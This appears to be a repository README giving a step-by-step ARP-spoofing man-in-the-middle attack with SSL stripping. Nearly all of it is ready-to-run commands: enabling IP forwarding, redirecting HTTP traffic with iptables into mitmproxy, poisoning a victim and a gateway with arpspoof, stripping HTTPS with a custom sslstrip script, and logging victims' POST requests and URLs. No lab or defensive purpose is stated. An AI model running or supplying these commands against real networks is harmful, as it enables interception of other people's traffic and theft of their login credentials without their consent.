MITM ATTACK WITH HTTP PROXYING ([MITMPROXY](http://docs.mitmproxy.org/en/stable/) v0.17.1)
----------
  
You can run **arpoison.ksh** which is automating the following steps:  

 - activate ip forwarding (all secured connections will be routed without interception):  
```bash
sysctl -w net.ipv4.ip_forward=1
```

 - avoid to send useless ICMP redirect messages
```bash
echo 0 | sudo tee /proc/sys/net/ipv4/conf/*/send_redirects
```

 - configure nat (8080 is the default listening port of mitmproxy):  
```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```
*The REDIRECT target is used to redirect packets and streams to the machine itself. This means that we could for example REDIRECT all packets destined for the HTTP ports to an HTTP proxy (useful for transparent proxying).*  

 - run mitm attack (update your ip addresses):  
```bash
xterm -geometry 100x25+1+200 -hold -e arpspoof -t [ip victim] [ip route]
xterm -geometry 100x25+1+300 -hold -e arpspoof -t [ip route] [ip victim]
```

 - check mitm attack is working on both ways:  
```bash
python ./chk_poison.py [ip victim] [ip route]
```

 - run mitmproxy with our custom sslstrip.py module and flowwriter.py logging only relevant POST requests (if you want to log trafic, **-a \<logfilename\>**):  
```bash
mitmproxy -T --anticache --host --anticomp --noapp --script ./sslstrip.py --script "./flowwriter.py ./post.log" --eventlog
```  
  
*N.B: mitmproxy (with option -w/-a for logging) will dump the whole flows in a tnetstrings format.*  
 
 - if you want to extra log urls in a file:   
```bash
urlsnarf > ./urlsnarf.txt &
```
  
**Now go on a website with an http landing webpage and try to click on a https link forwarding to a secure area. All trafic should stay clair between the victim and mitmproxy.**  
  
**Don't hesitate to contribute and to upgrade the sslstrip.py or chk_poison.py module.**


